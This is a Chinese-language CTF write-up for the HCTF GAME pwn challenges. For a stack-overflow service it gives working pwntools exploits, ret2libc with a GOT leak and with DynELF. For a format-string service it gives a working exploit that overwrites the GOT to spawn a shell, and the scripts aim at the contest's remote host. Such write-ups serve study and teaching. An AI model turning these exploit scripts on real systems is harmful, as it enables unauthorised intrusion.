---
title: HCTF GAME PWN题 WP
tags:
  - CTF
  - HCTF GAME
  - PWN
date: 2017/3/1
---

## pwn step0	
比较简单，看ida的代码，直接用超长的字符串覆盖变量即可。
## pwn step1
比较简单，看ida的代码，直接覆盖返回值即可。
## pwn step2
比较简单，看ida的代码，直接在栈上执行shellcode就行。
## pwn step3:Baka Server

题目描述：
> 会放嘲讽的baka程序>///< 
> bin: http://pan.baidu.com/s/1cy7hE2 密码：wge1
> nc 121.42.206.184 10001
> Hint: 关键词：rop，ret to libc
> 环境：ubuntu17.04 默认版本glibc
> Dockerfile:FROM ubuntu:17.04

先检查一下保护
```
veritas@ubuntu:~/pwn$ checksec baka
[*] '/home/veritas/pwn/baka'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

main函数

```
.text:0804859E ; Attributes: bp-based frame
.text:0804859E
.text:0804859E ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0804859E                 public main
.text:0804859E main            proc near               ; DATA XREF: _start+17o
.text:0804859E
.text:0804859E argc            = dword ptr  8
.text:0804859E argv            = dword ptr  0Ch
.text:0804859E envp            = dword ptr  10h
.text:0804859E
.text:0804859E                 push    ebp
.text:0804859F                 mov     ebp, esp
.text:080485A1                 and     esp, 0FFFFFFF0h
.text:080485A4                 sub     esp, 10h
.text:080485A7                 mov     dword ptr [esp], offset aComeOnPwnMe ; "come on, pwn me!"
.text:080485AE                 call    _puts
.text:080485B3                 mov     dword ptr [esp], 0 ; stream
.text:080485BA                 call    _fflush
.text:080485BF                 call    read_buffer
.text:080485C4                 mov     eax, 0
.text:080485C9                 leave
.text:080485CA                 retn
.text:080485CA main            endp
```

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  puts("come on, pwn me!");
  fflush(0);
  read_buffer();
  return 0;
}
```

read_buffer函数：

```
.text:0804850D ; void __cdecl read_buffer()
.text:0804850D                 public read_buffer
.text:0804850D read_buffer     proc near               ; CODE XREF: main+21p
.text:0804850D
.text:0804850D s               = byte ptr -28h
.text:0804850D
.text:0804850D                 push    ebp
.text:0804850E                 mov     ebp, esp
.text:08048510                 sub     esp, 38h
.text:08048513                 mov     dword ptr [esp+8], 14h ; n
.text:0804851B                 mov     dword ptr [esp+4], 0 ; c
.text:08048523                 lea     eax, [ebp+s]
.text:08048526                 mov     [esp], eax      ; s
.text:08048529                 call    _memset
.text:0804852E                 mov     dword ptr [esp+8], 100h ; nbytes
.text:08048536                 lea     eax, [ebp+s]
.text:08048539                 mov     [esp+4], eax    ; buf
.text:0804853D                 mov     dword ptr [esp], 0 ; fd
.text:08048544                 call    _read
.text:08048549                 mov     dword ptr [esp+4], offset s2 ; "I'm baka!\n"
.text:08048551                 lea     eax, [ebp+s]
.text:08048554                 mov     [esp], eax      ; s1
.text:08048557                 call    _strcmp
.text:0804855C                 test    eax, eax
.text:0804855E                 jz      short loc_8048584
.text:08048560                 mov     dword ptr [esp], offset s ; "...you are so boring."
.text:08048567                 call    _puts
.text:0804856C                 mov     dword ptr [esp], 0 ; stream
.text:08048573                 call    _fflush
.text:08048578                 mov     dword ptr [esp], 1 ; status
.text:0804857F                 call    _exit
.text:08048584 ; ---------------------------------------------------------------------------
.text:08048584
.text:08048584 loc_8048584:                            ; CODE XREF: read_buffer+51j
.text:08048584                 mov     dword ptr [esp], offset aLolIAgreeWithU ; "LOL, I agree with u!"
.text:0804858B                 call    _puts
.text:08048590                 mov     dword ptr [esp], 0 ; stream
.text:08048597                 call    _fflush
.text:0804859C                 leave
.text:0804859D                 retn
.text:0804859D read_buffer     endp
```

```
void __cdecl read_buffer()
{
  char s; // [sp+10h] [bp-28h]@1

  memset(&s, 0, 0x14u);
  read(0, &s, 0x100u);
  if ( strcmp(&s, "I'm baka!\n") )
  {
    puts("...you are so boring.");
    fflush(0);
    exit(1);
  }
  puts("LOL, I agree with u!");
  fflush(0);
}
```

可以看出，在read处有溢出，但是如果strcmp的结果不是"I'm baka!\n"，就会直接exit，就无法利用溢出。

由于strcmp是根据\x00截断的，所以构造将payload的头部构造成：`"I'm baka!\n" + '\x00'*2 + 'a'*28 + 'bbbb'`就可以绕过检查。

接下来就有**三种方法**可以做这道题目了。

先说low一点的，我们先根据提示，下载libc-2.24.so。
libc-2.24.so下载地址：链接：http://pan.baidu.com/s/1slrWTop 密码：zsj2

有了libc，方法就简单了，先根据got表leak read函数的真实地址，然后根据现有的libc算出system和read的偏移，从而得到system的真实地址，然后向bss段写入字符串"/bin/sh\x00"，在执行system就可以拿shell了。

poc如下：

```python
from pwn import *
#context.log_level = 'debug'

baka = ELF('baka')
libc = ELF('libc-2.24.so')
#libc = ELF('/lib32/libc.so.6')
stuff = "I'm baka!\n" + '\x00'*2 + 'a'*28 + 'bbbb'
p1ret=0x08048375
p3ret=0x0804862d
base_bss = 0x0804a034
#///////////////////

#cn = process('baka')
cn = remote('121.42.206.184', 10001)

print cn.recv()# come on, pwn me!cat 
p1 = stuff + p32(0x080485ae) + p32(baka.got['read'])
print '\n###send payload 1###'
cn.sendline(p1)
print cn.recvuntil('u!\n')#agree with u!
p_read = u32(cn.recv(4))

p_system = p_read - libc.symbols['read'] + libc.symbols['system']

cn.recv()

p2 = stuff + p32(p_read) + p32(p3ret) + p32(0) + p32(base_bss) + p32(10) + p32(p_system) + 'bbbb' + p32(base_bss)

print '\n###send payload 2###'
cn.sendline(p2)
cn.recvuntil('u!\n')#agree with u!
cn.send('/bin/sh\0')
time.sleep(0.3)
cn.interactive()
```


然后是稍微高端一点方法，不需要预先知道libc的版本，通过leak两个地址的真实地址，到 http://libcdb.com/ 去搜索即可知道libc的版本。这里就不写poc了，反正拿到libc以后就和方法一一样了。


接下来是第三种方法，不需要得到libc。

首先，pwntools有一个叫dynelf的库，其中有一个叫做lookup的方法，只要你能提供一个循环leak的函数句柄，就可以动态找到指定函数的地址。

官方文档的示例：

```python
# Assume a process or remote connection
p = process('./pwnme')

# Declare a function that takes a single address, and
# leaks at least one byte at that address.
def leak(address):
    data = p.read(address, 4)
    log.debug("%#x => %s" % (address, (data or '').encode('hex')))
    return data

# For the sake of this example, let's say that we
# have any of these pointers.  One is a pointer into
# the target binary, the other two are pointers into libc
main   = 0xfeedf4ce
libc   = 0xdeadb000
system = 0xdeadbeef

# With our leaker, and a pointer into our target binary,
# we can resolve the address of anything.
#
# We do not actually need to have a copy of the target
# binary for this to work.
d = DynELF(leak, main)
assert d.lookup(None,     'libc') == libc
assert d.lookup('system', 'libc') == system

# However, if we *do* have a copy of the target binary,
# we can speed up some of the steps.
d = DynELF(leak, main, elf=ELF('./pwnme'))
assert d.lookup(None,     'libc') == libc
assert d.lookup('system', 'libc') == system

# Alternately, we can resolve symbols inside another library,
# given a pointer into it.
d = DynELF(leak, libc + 0x1234)
assert d.lookup('system')      == system
```

通过这种方法我们动态找到system的地址，接下来就和方法一一样了。

poc如下：

```python
from pwn import *
#context.log_level = 'debug'
stuff = "I'm baka!\n" + '\x00'*2 + 'a'*28 + 'bbbb'

def leak(address):
    count = 0
    data = ''
    p1 = stuff + p32(0x080485ae) + p32(address)
    cn.sendline(p1)
    print cn.recvuntil('u!\n')
    up = ""
    while True:
        c = cn.recv(numb=1,timeout=0.2)
        count += 1
        if up == '\n' and c == "":
            data = data[:-1]
            data += "\x00"
            break
        else:
            data += c
        up = c
    data = data[:4]
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data
#/////////////////////////////

#cn = process('baka')
cn = remote('121.42.206.184',10001)

baka = ELF('baka')

p3ret=0x0804862d
base_bss = 0x0804a034

cn.recv()# come on, pwn me!
d = DynELF(leak, elf=ELF('baka'))
p_system = d.lookup('system','libc')
print "p_system => " + hex(p_system)
p_read = d.lookup('read','libc')
print "p_read => " + hex(p_read)


p2 = stuff + p32(p_read) + p32(p3ret) + p32(0) + p32(base_bss) + p32(10) + p32(p_system) + 'bbbb' + p32(base_bss)

print '\n###send payload 2###'
cn.sendline(p2)
cn.recvuntil('u!\n')#agree with u!
cn.send('/bin/sh\0')
time.sleep(0.3)
cn.interactive()
```

这里还要提一点，就是puts函数在输出时是依靠\x00截断的，而且会在结尾加上一个\x0a换行符，所以我们不能像write函数一样稳定leak4字节，而是最少leak1字节。

这里我引用一篇文章：http://bobao.360.cn/learning/detail/3298.html

文章中讲到了关于用puts函数leak的一些细节。

**以下为引用：**

puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“\x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含\x00截断符，输出就会终止，且会自动将“\n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。

为了克服输入不受控这一缺点，我们考虑利用puts函数输出的字符串最后一位为“\n“这一特点，分两种情况来解决。

（1）puts输出完后就没有其他输出，在这种情况下的leak函数可以这么写。

```python
def leak(address):
  count = 0
  data = ''
  payload = xxx
  p.send(payload)
  print p.recvuntil('xxx\n') #一定要在puts前释放完输出
  up = ""
  while True:
    #由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了
    #以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””
    c = p.recv(numb=1, timeout=1)
    count += 1
    if up == '\n' and c == "":  #接收到的上一个字符为回车符，而当前接收不到新字符，则
      buf = buf[:-1]             #删除puts函数输出的末尾回车符
      buf += "\x00"
      break
    else:
      buf += c
    up = c
  data = buf[:4]  #取指定字节数
  log.info("%#x => %s" % (address, (data or '').encode('hex')))
  return data
```

（2）puts输出完后还有其他输出，在这种情况下的leak函数可以这么写。

```python
def leak(address):
  count = 0
  data = ""
  payload = xxx
  p.send(payload)
  print p.recvuntil("xxx\n")) #一定要在puts前释放完输出
  up = ""
  while True:
    c = p.recv(1)
    count += 1
    if up == '\n' and c == "x":  #一定要找到泄漏信息的字符串特征
      data = buf[:-1]                     
      data += "\x00"
      break
    else:
      buf += c
    up = c
  data = buf[:4] 
  log.info("%#x => %s" % (address, (data or '').encode('hex')))
  return data
```

**引用结束**

所以我们得到flag:`hctf{Baka_Baka_Baka_QAQ}`

## pwn step4:古老的zz程序

题目描述：
> bin: http://pan.baidu.com/s/1eR8YfOe 密码：7sd3
> nc 121.42.206.184 10002

在此先提供一份源码：

```cpp
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <stdlib.h>
void timeout(){
    write(1,"timeout!\n",9);
    exit(0);
}

void init(){
    alarm(30);
    signal(SIGALRM,timeout);
}

void menu(){
    puts("welcome to my servvvvvvvvvvvvver!!!!!");
    puts("here you can:");
    puts("1.get time");
    puts("2.get flag");
    fflush(0);
}

void get_time(){
    system("TZ=CST-8 date");
}

void get_flag(){
    char buffer[0x100];
    puts("give me flag!");
    fflush(0);
    read(0,buffer,0x100);
    printf("ok, flag is ");
    printf(buffer);
    printf(":)\n");
    fflush(0);
}

int main(int argc,char* argv[]){
    init();
    char select[2];
    while(1){
        menu();
        read(0,&select,2);
        switch(atoi(&select)){
        case 1:
            get_time();
            break;
        case 2:
            get_flag();
            break;
        default:
            printf("???\n");
            fflush(0);
        }
    }
}
```

有了源码，我就不放ida反编译的版本了。

这道题目是一个格式化字符串漏洞实现任意地址读和写的漏洞。

大致思路是先测出格式化字符串的偏移，然后利用格式化字符串leak出got表里printf的真实地址。根据题目提供的libc库算出system和printf的偏移量，从而得到system的真实地址，再利用格式化字符串漏洞把system的真实地址写到got表中原printf的位置上，最后调用get_flag中的printf(buffer)，传入的buffer为“/bin/sh\x00”，printf被覆盖成system，从而get shell。


```python
from pwn import *
#context.log_level = 'debug'
libc = ELF('/lib32/libc.so.6')
pwn4 = ELF('pwn4')
def exec_fmt(payload):
	print cn.recvuntil('flag\n')
	cn.sendline('2')
	print cn.recvuntil('flag!\n')
	cn.send(payload)
	cn.recvuntil('is ')
	ret = cn.recvline()
	return ret

#cn = process('pwn4')
cn = remote('121.42.206.184',10002)
#///////////////////////// get fmt length
auto_fmt = FmtStr(exec_fmt)
print '\nget fmt length######'

#///////////////////////// leak p_printf
print cn.recv()
cn.sendline('1')
print cn.recv()
cn.sendline('2')
print cn.recvuntil('flag!\n')
cn.send(p32(pwn4.got['system'])+'START%7$sEND')
cn.recvuntil("START")
p_system = u32(cn.recv()[:4])
print '\n##########p_system'+hex(p_system)
chg_got = fmtstr_payload(auto_fmt.offset, {pwn4.got['printf']: p_system})
cn.sendline('2')
print cn.recvuntil('flag!\n')
cn.send(chg_got)
print cn.recv()
cn.sendline('2')
print cn.recvuntil('flag!\n')
cn.send('/bin/sh\x00')
cn.interactive()
```

flag：`hctf{format_string_make_sense}`